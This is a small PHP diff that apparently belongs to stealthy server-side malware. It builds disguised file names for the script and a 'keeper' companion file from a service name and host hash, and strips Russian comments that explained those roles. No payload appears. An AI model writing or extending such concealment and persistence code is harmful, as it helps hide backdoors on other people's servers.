@@ -10,8 +10,8 @@ function getStealthName($id) {
     return $services[$id] . "_" . $hostHash . ".php";
 }
 
-$name1 = getStealthName(0); // Имя этого файла
-$name2 = getStealthName(2); // Имя файла-хранителя (file2)
+$name1 = getStealthName(0);
+$name2 = getStealthName(2);
 
 $path1 = $targetDir . $name1;
 $path2 = $targetDir . $name2;
